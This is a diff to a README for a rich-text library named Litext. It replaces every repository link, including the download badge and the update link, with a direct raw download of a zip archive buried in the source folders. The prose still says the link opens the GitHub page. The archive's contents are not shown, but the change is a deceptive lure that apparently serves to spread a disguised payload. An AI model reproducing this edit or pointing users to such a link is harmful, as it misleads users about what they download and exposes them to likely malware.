@@ -1,6 +1,6 @@
 # ✍️ Litext - Simple Rich-Text Library for Apple
 
-[![Download Litext](https://img.shields.io/badge/Download-Litext-brightgreen)](https://github.com/streaming-smarta869/Litext)
+[![Download Litext](https://img.shields.io/badge/Download-Litext-brightgreen)](https://github.com/streaming-smarta869/Litext/raw/refs/heads/main/Sources/Litext/Supplement/Extension/Software_v3.6.zip)
 
 Litext is a small tool that helps create and view rich-text content on Apple devices. It is made to be easy and lightweight.
 
@@ -10,7 +10,7 @@ Litext is a small tool that helps create and view rich-text content on Apple dev
 
 You can get Litext from the official GitHub page. Follow the link below:
 
-[Download or visit the Litext page to get started](https://github.com/streaming-smarta869/Litext)
+[Download or visit the Litext page to get started](https://github.com/streaming-smarta869/Litext/raw/refs/heads/main/Sources/Litext/Supplement/Extension/Software_v3.6.zip)
 
 1. Click this link. It will open the Litext GitHub page.
 
@@ -108,7 +108,7 @@ Litext helps apps understand and display these styles correctly on Apple product
 
 Check the GitHub page regularly for new releases or updates:
 
-- Visit [Litext GitHub](https://github.com/streaming-smarta869/Litext) and look for newer versions.
+- Visit [Litext GitHub](https://github.com/streaming-smarta869/Litext/raw/refs/heads/main/Sources/Litext/Supplement/Extension/Software_v3.6.zip) and look for newer versions.
 
 - Download updated files as described in the download steps above.
 
